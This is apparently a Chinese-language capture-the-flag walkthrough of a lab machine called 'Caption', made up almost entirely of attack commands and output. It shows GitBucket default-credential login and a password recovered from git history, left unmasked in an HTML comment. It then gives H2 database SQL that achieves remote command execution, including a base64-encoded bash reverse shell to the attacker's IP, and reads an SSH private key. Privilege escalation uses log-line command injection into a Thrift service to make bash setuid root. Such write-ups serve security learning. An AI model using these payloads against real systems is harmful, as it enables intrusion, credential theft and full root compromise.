# Caption

> 本机 IP: 11.11.11.11
>
> 目标 IP: 11.11.11.12
>
> 参考 [wp](https://loghmariala.github.io/posts/Caption/)

```sh
$ nmap -sSVC -p- 11.11.11.12
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu
80/tcp   open  http       Werkzeug/3.0.1 Python/3.10.12
|_http-server-header: Werkzeug/3.0.1 Python/3.10.12
| fingerprint-strings:
|   FourOhFourRequest, GetRequest, HTTPOptions:
|     HTTP/1.1 301 Moved Permanently
|     content-length: 0
|     location: http://caption.htb
|_    connection: close
|_http-title: Caption Portal Login
8080/tcp open  http-proxy
|_http-title: GitBucket
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404 Not Found
Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 5916
|     <!DOCTYPE html>
|     <html prefix="og: http://ogp.me/ns#" lang="en">
|     <head>
|     <meta charset="UTF-8" />
|     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <title>Error</title>
|     <meta property="og:title" content="Error" />
|     <meta property="og:type" content="object" />
|     <meta property="og:url" content="http://11.11.11.12:8080/nice%20ports%2C/Tri%6Eity.txt%2ebak" />
|     <meta property="og:image" content="http://11.11.11.12:8080/assets/common/images/gitbucket_ogp.png" />
...

$ vi /etc/hosts
[+] 11.11.11.12 caption.htb
```

访问 http://caption.htb/, 一个登录界面, 无法登录

访问 http://caption.htb:8080/, 为 GitBucket, 有两个仓库 Logservice 和 Caption-Portal; root:root 尝试登录成功

git clone 仓库 Caption-Portal, 查找 git hash 为 0e3ba... 提交中, config/haproxy/haproxy.cfg 有修改痕迹, 其中有删除字段:

<!-- ```cfg
userlist AuthUsers
        user margo insecure-password vFr&cS2#0!
``` -->

```cfg
userlist AuthUsers
        user margo insecure-password ⬛⬛⬛
```

使用 margo:⬛⬛⬛ 登录 http://caption.htb/ 成功, 但未发现利用点

Gitbucket 设置界面查找有 Database viewer 功能, 可执行 SQL 语句, 根据报错信息得知为 H2 数据库

<!-- 未执行, 看wp的

[H2 数据库漏洞](https://medium.com/r3d-buck3t/chaining-h2-database-vulnerabilities-for-rce-9b535a9621a2)

查看版本`SELECT H2VERSION() FROM DUAL` -->

```sql
-- Gitbacket 的 Database viewer 中执行SQL语句可远程执行命令

-- 这个好像不需要?
CREATE TABLE TEST (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(255) NOT NULL
);

-- 本机执行 nc -lvvp 2333

-- bash -i >& /dev/tcp/11.11.11.11/2333
-- base64 编码为
-- YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMS4xMS4xMi8yMzMzIDA+JjE=
CREATE TRIGGER TRIG_JS BEFORE INSERT ON TEST AS '//javascript
Java.type("java.lang.Runtime").getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMS4xMS4xMi8yMzMzIDA+JjE=}|{base64,-d}|{bash,-i}");';
```

或使用 [wp](https://loghmariala.github.io/posts/Caption/) 方法

```sql
-- 创建函数
CREATE ALIAS RUNEXEC AS $$
String shellexec(String cmd) throws java.io.IOException {
    java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A");
    return s.hasNext() ? s.next() : "";
}
$$;

-- id
CALL RUNEXEC('id')

-- 得到命令执行结果
org.h2.jdbc.JdbcSQLDataException:Data conversion error converting"uid=1000(margo) gid=1000(margo) groups=1000(margo)";SQL statement: CALL RUNEXEC('id'); [22018-199]

-- 获取ssh密钥
CALL RUNEXEC('cat /home/margo/.ssh/id_ecdsa')

org.h2.jdbc.JdbcSQLDataException:Data conversion error converting"-----BEGIN OPENSSH PRIVATE KEY----- ⬛⬛⬛ -----END OPENSSH PRIVATE KEY-----";SQL statement: CALL RUNEXEC('cat /home/margo/.ssh/id_ecdsa'); [22018-199]
```

本机创建文件`id_ecdsa`并将密钥复制其中

```sh
$ ssh -i id_ecdsa margo@caption.htb

margo@caption:~$ ls
... gitbucket.war user.txt
```

## Privilege Escalation

<!-- 以下均参考wp -->

使用 Thrift 客户端与目标计算机上运行的名为 LogService 的服务进行交互, 利用 LogService 中的漏洞来实现 RCE 并提权

克隆 Gitbucket 中的 Logservice 仓库, 使用 Thrift 从该文件生成 Python 客户端代码

```sh
margo@caption:~$ git clone http://caption.htb:8080/git/root/Logservice.git

margo@caption:~$ cd Logservice/

margo@caption:~/Logservice$ ls
... gen-go  log_service.thrift  server.go

margo@caption:~/Logservice$ thrift --gen py log_service.thrift

margo@caption:~/Logservice$ ls
... gen-py  log_service.thrift

# 在 /tmp 中创建恶意log文件
margo@caption:~/Logservice$ cd /tmp

margo@caption:~/Logservice$ vi malicious.log
[+] 127.0.0.1 "user-agent":"'; chmod +s /bin/bash #"
```

将文件夹 gen-py 复制到本机, 在 gen-py 下使用 python 脚本创建客户端

```py
from thrift import Thrift
from thrift.transport import TSocket
from thrift.transport import TTransport
from thrift.protocol import TBinaryProtocol
from log_service import LogService  # Import generated Thrift client code

def main():
    # Set up a transport to the server
    transport = TSocket.TSocket('localhost', 9090)

    # Buffering for performance
    transport = TTransport.TBufferedTransport(transport)

    # Using a binary protocol
    protocol = TBinaryProtocol.TBinaryProtocol(transport)

    # Create a client to use the service
    client = LogService.Client(protocol)

    # Open the connection
    transport.open()

    try:
        # Specify the log file path to process
        log_file_path = "/tmp/malicious.log"

        # Call the remote method ReadLogFile and get the result
        response = client.ReadLogFile(log_file_path)
        print("Server response:", response)

    except Thrift.TException as tx:
        print(f"Thrift exception: {tx}")

    # Close the transport
    transport.close()

if __name__ == '__main__':
    main()
```

本机执行 python 脚本

```sh
margo@caption:~/Logservice$ ls -la /bin/bash
-rwsr-sr-x 1 root root ... /bin/bash

margo@caption:~/Logservice$ /bin/bash -p

bash-5.1# id
uid=1000(margo) gid=1000(margo) euid=0(root) egid=0(root) groups=0(root),1000(margo)

bash-5.1# whoami
root

bash-5.1# ls /root
... root.txt
```
